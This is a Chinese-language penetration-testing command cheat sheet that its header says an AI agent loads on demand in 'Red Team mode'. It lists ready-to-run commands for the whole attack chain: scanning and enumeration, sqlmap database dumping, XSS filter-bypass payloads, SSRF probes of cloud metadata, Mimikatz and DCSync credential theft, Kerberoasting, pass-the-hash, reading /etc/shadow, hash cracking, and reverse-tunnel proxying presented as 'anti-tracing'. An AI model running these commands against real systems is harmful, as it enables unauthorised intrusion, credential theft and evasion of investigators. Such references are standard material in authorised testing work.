> 被 SKILL.md "10. On-Demand References" 索引。进入 Red Team 模式或需要渗透测试命令参考时加载。

# 渗透测试常用命令速查

## 信息收集

### 端口扫描（Nmap）

```bash
# TCP SYN 扫描（默认，需要 root）
nmap -sS -p- -T4 [TARGET_IP]

# 服务版本探测
nmap -sV -sC -p 22,80,443,3306,8080 [TARGET_IP]

# UDP 扫描
nmap -sU --top-ports 100 [TARGET_IP]

# 操作系统探测
nmap -O [TARGET_IP]

# NSE 脚本扫描（漏洞检测）
nmap --script vuln [TARGET_IP]
```

### 子域名枚举

```bash
# 使用 Sublist3r
sublist3r -d example.com

# 使用 Amass
amass enum -d example.com

# 证书透明度日志
curl -s "https://crt.sh/?q=%25.example.com&output=json" | jq .

# DNS 暴力枚举
gobuster dns -d example.com -w /usr/share/wordlists/subdomains.txt
```

### 目录枚举

```bash
# Gobuster
gobuster dir -u https://example.com -w /usr/share/wordlists/dirb/common.txt -x php,html,txt

# ffuf
ffuf -u https://example.com/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Dirsearch
dirsearch -u https://example.com -e php,asp,aspx,jsp,html
```

## Web 安全测试

### SQL 注入测试（sqlmap）

```bash
# 基础检测
sqlmap -u "https://example.com/page.php?id=1" --batch

# 指定数据库类型
sqlmap -u "https://example.com/page.php?id=1" --dbms=mysql --batch

# 获取数据库名
sqlmap -u "https://example.com/page.php?id=1" --dbs

# 获取表名
sqlmap -u "https://example.com/page.php?id=1" -D [DATABASE] --tables

# 获取列内容
sqlmap -u "https://example.com/page.php?id=1" -D [DATABASE] -T [TABLE] --dump

# POST 请求注入
sqlmap -u "https://example.com/login.php" --data="username=admin&password=123" --batch
```

### XSS 测试

```html
<!-- 基础反射 XSS -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

<!-- 绕过简单过滤 -->
<scr<script>ipt>alert(1)</scr</script>ipt>
<IMG SRC=# onmouseover="alert('XSS')">
```

### SSRF 测试

```bash
# 云元数据探测
# AWS: http://169.254.169.254/latest/meta-data/
# GCP: http://metadata.google.internal/
# 阿里云: http://100.100.100.200/latest/meta-data/
# 腾讯云: http://metadata.tencentyun.com/latest/meta-data/

# 利用 curl 进行 SSRF
curl "https://vulnerable-site.com/fetch?url=http://169.254.169.254/latest/meta-data/"

# 探测内网端口
curl "https://vulnerable-site.com/fetch?url=http://127.0.0.1:3306/"
curl "https://vulnerable-site.com/fetch?url=http://127.0.0.1:6379/"
```

## 内网渗透

### 凭证攻击

```powershell
# Mimikatz 提权 + 凭证提取
privilege::debug
sekurlsa::logonpasswords
sekurlsa::ekeys
token::elevate
lsadump::sam
lsadump::secrets

# DCSync
lsadump::dcsync /domain:[DOMAIN] /user:krbtgt

# Impacket - secretsdump (远程 SAM)
secretsdump.py [DOMAIN]/[USER]:[PASSWORD]@[DC_IP]
```

```bash
# Kerberoasting (获取服务票据)
GetUserSPNs.py [DOMAIN]/[USER]:[PASSWORD] -dc-ip [DC_IP] -request

# AS-REP Roasting
GetNPUsers.py [DOMAIN]/ -usersfile users.txt -format hashcat -outputfile hashes.asrep

# Pass-the-Hash
wmiexec.py -hashes [LM:NTLM] [DOMAIN]/[USER]@[TARGET_IP]

# Pass-the-Ticket
export KRB5CCNAME=ticket.ccache
wmiexec.py -k -no-pass [DOMAIN]/[USER]@[TARGET_IP]
```

### 后渗透信息收集

```bash
# Linux
id && uname -a && cat /etc/*release
sudo -l
find / -perm -4000 -type f 2>/dev/null
netstat -tlnp
ps auxf
crontab -l
cat /etc/passwd /etc/shadow 2>/dev/null
```

```powershell
# Windows
whoami /all
net user /domain
net group "Domain Admins" /domain
systeminfo
tasklist /svc
netstat -ano
schtasks /query /fo LIST /v
reg query HKLM\SYSTEM\CurrentControlSet\Services
Get-Process -IncludeUserName
```

## 密码破解

```bash
# Hashcat - NTLM 破解
hashcat -m 1000 -a 0 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt

# Hashcat - Kerberos TGS 票据 (Kerberoasting)
hashcat -m 13100 krb_tgs.txt /usr/share/wordlists/rockyou.txt

# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# hash-identifier（识别哈希类型）
hash-identifier [HASH_VALUE]
```

## 反溯源与代理

```bash
# SSH 隧道
ssh -D 1080 user@jump-server  # SOCKS 代理
ssh -L 8080:internal:80 user@jump-server  # 本地端口转发

# Chisel 隧道
# 服务端
./chisel server -p 8000 --reverse
# 客户端
./chisel client [SERVER_IP]:8000 R:socks

# proxychains 配置
# /etc/proxychains4.conf
# socks5 127.0.0.1 1080
proxychains4 nmap -sT -Pn [INTERNAL_IP]
```
